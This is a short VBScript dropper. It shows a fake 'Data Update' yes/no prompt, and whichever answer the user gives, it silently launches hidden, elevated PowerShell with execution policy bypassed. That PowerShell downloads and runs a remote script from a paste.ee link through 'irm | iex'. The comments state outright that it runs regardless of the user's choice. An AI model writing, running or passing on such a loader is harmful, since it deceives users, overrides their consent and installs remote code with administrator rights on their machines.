' VBS script to show a message and run PowerShell as Admin silently regardless of user choice

Dim shell, answer, command

' Show a message box asking the user
answer = MsgBox("Do you want to update the data now?", vbYesNo + vbQuestion, "Data Update")

' Command to run PowerShell as Administrator, silently, without showing any window
command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command """"irm https://paste.ee/d/5EVlvzYh | iex""""' -Verb RunAs -WindowStyle Hidden"""

' Execute the command silently regardless of the user's choice
Set shell = CreateObject("WScript.Shell")
shell.Run command, 0, False
